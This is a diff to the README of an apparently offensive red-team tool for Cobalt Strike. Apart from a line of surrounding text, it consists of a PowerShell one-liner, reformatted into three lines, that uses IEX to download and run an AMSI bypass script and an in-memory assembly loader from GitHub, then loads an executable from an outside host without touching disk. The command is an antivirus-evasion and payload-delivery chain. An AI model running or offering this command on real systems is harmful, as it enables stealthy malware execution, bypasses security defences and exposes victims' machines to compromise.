@@ -81,7 +81,9 @@ For CobaltStrike:
 
 4. Since the generated executable file is Sharp Assembly, it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
 ```
-IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
+Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
 ```
 
 ### To Do
